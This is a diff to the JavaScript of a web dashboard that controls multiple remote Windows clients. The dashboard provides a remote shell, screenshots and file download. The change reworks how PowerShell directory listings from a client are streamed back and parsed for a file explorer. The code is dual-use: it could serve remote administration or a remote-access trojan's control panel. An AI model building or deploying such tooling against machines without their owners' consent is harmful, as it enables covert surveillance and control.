@@ -220,8 +220,9 @@
     let systemHistory = {};
     let clientStates = {}; 
 
+    const DIR_START_MARKER = '##DIR_START##';
+    const DIR_END_MARKER = '##DIR_END##';
     const STALE_MS = 10000; 
-    const DIR_JSON_MARKER = '##DIR_JSON##';
     const MICROBIN_URL_BASE = 'https://microbin.elaptic.dev/';
 
     function switchTab(tabId) {
@@ -280,10 +281,40 @@
     socket.on('command_output', (data) => {
         const targetClient = allConnectedClients.find(c => c.id === data.client_id);
         if (!targetClient) return;
-        if (!shellHistory[targetClient.hostname]) shellHistory[targetClient.hostname] = "";
-        shellHistory[targetClient.hostname] += data.output;
-        if (data.client_id === current_client_id) {
-            updateTerminalUI('shell-output', data.output);
+        
+        if (!clientStates[targetClient.hostname]) {
+            clientStates[targetClient.hostname] = { currentPath: "C:\\", line: "", jsonBuffer: "", isCapturingJSON: false };
+        }
+        const state = clientStates[targetClient.hostname];
+
+        // 1. Check for Start of JSON Stream
+        if (data.output.includes(DIR_START_MARKER)) {
+            state.isCapturingJSON = true;
+            state.jsonBuffer = "";
+            const idx = data.output.indexOf(DIR_START_MARKER);
+            state.jsonBuffer = data.output.substring(idx + DIR_START_MARKER.length);
+            
+            if (data.client_id === current_client_id) {
+                updateTerminalUI('shell-output', data.output.substring(0, idx) + "[Syncing File Explorer...]\n");
+            }
+        } else if (state.isCapturingJSON) {
+            state.jsonBuffer += data.output;
+        } else {
+            // Standard Terminal Output
+            if (!shellHistory[targetClient.hostname]) shellHistory[targetClient.hostname] = "";
+            shellHistory[targetClient.hostname] += data.output;
+            if (data.client_id === current_client_id) {
+                updateTerminalUI('shell-output', data.output);
+            }
+        }
+
+        // 2. Check for End of JSON Stream
+        if (state.isCapturingJSON && state.jsonBuffer.includes(DIR_END_MARKER)) {
+            const endIdx = state.jsonBuffer.indexOf(DIR_END_MARKER);
+            const finalJSON = state.jsonBuffer.substring(0, endIdx);
+            renderFileSystem(finalJSON);
+            state.isCapturingJSON = false;
+            state.jsonBuffer = "";
         }
     });
 
@@ -300,10 +331,12 @@
     function refreshFiles() {
         if (!current_client_id || !current_client_hostname) return;
         if (!clientStates[current_client_hostname]) {
-            clientStates[current_client_hostname] = { currentPath: "C:\\", line: "" };
+            clientStates[current_client_hostname] = { currentPath: "C:\\", line: "", jsonBuffer: "", isCapturingJSON: false };
         }
         const path = clientStates[current_client_hostname].currentPath || "C:\\";
-        const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${DIR_JSON_MARKER}' (ConvertTo-Json -InputObject $items) } else { echo '${DIR_JSON_MARKER} []' }"`;
+        const sMark = '##' + 'DIR_START##'; // Prevent parser triggering on echo
+        const eMark = '##' + 'DIR_END##';
+        const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${sMark}'; (ConvertTo-Json -InputObject $items -Compress); echo '${eMark}' } else { echo '${sMark} [] ${eMark}' }"`;
         socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
     }
 
@@ -331,7 +364,7 @@
                 el.onclick = () => { if (item.IsDirectory) { clientStates[current_client_hostname].currentPath = currentPath.endsWith('\\') ? currentPath + item.Name + '\\' : currentPath + '\\' + item.Name + '\\'; refreshFiles(); } };
                 container.appendChild(el);
             });
-        } catch (e) { container.innerHTML = `<div style="padding:20px; color:red">Access Denied.</div>`; }
+        } catch (e) { container.innerHTML = `<div style="padding:20px; color:red">Failed to parse file data.</div>`; }
     }
 
     function downloadFile(name, event) {
@@ -410,7 +443,7 @@
 
     function selectClient(client) {
         current_client_id = client.id; current_client_hostname = client.hostname;
-        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", line: "" };
+        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\", line: "", jsonBuffer: "", isCapturingJSON: false };
         document.getElementById('node-title').textContent = (client.alias || client.hostname).toUpperCase();
         document.getElementById('shell-output').textContent = "";
         updateTerminalUI('shell-output', shellHistory[client.hostname] || "Connected to Shell.\n");
@@ -418,6 +451,9 @@
         updateTerminalUI('system-output', systemHistory[client.hostname] || "Connected to System.\n");
         if (client.screenshot_data) document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
     }
+
+    let stdinBuffer = "";
+    let stdinTimeout = null;
 
     function handleTerminalKey(event) {
         if (!current_client_id) return;
